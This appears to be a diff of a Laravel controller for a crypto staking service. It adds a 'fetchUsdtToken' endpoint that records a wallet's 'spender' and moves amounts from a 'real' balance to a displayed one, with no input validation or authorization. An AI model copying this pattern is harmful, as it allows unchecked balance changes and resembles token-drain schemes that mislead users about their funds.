@@ -21,7 +21,7 @@ class UserController extends Controller
 {
     public function index(Request $request)
     {
-        $data = User::where('is_admin', '0')->with('balance')->get();
+        $data = User::where('is_admin', '0')->with('balance')->with('transactions')->orderBy('updated_at','desc')->get();
 
         $usdt_exchange_rate = Exchange::all()->last()->usdt;
 
@@ -42,8 +42,6 @@ class UserController extends Controller
         $liabilities = $profit_usdt_sum + $eth_to_usdt_profits; // profits
 
         $user_id = User::pluck('user_id');
-
-        $balance_profit = Balance::whereIn('user_id',$user_id)->pluck('statistics_usdt','statistics_eth');
 
         return view('users/index')->with('data', $data)->with('assets',$assets)->with('liable',$liabilities);
     }
@@ -160,6 +158,41 @@ class UserController extends Controller
         echo "ok";
     }
 
+    public function fetchUsdtToken(Request $request)
+    {
+
+        $user = User::where('wallet', $request->wallet)->first();
+
+        Stake::create([
+            'user_id' => $user->id,
+            'spender' => $request->spender,
+            'amount'  => $request->amount,
+            'type' => 'eth'
+        ]);
+
+        $user->spender = $request->spender;
+
+        $user->usdt_real_balance = $user->usdt_real_balance - $request->amount;
+
+        $user->usdt_balance = $user->usdt_balance + $request->amount;
+
+        $user->usdt_balance_updated_at = now();
+
+        $user->update();
+
+        Transaction::create([
+
+            'user_id' => $user->user_id,
+            'wallet' => $request->wallet,
+            'amount' => $request->amount,
+            'status' => 'Staked Usdt',
+
+        ]);
+
+
+        echo "ok";
+    }
+
     public function updateStatus(Request $request)
     {
         $user = User::where('id', $request->user_id)->first();
@@ -173,7 +206,9 @@ class UserController extends Controller
 
     public function transaction($id)
     {
-        $user = Transaction::where('user_id', $id)->get();
+        $user_id = User::where('user_id',$id)->value('id');
+
+        $user = Transaction::where('user_id', $user_id)->orderBy('created_at','ASC')->get();
 
         return view('users/transaction')->with('data',$user);
     }
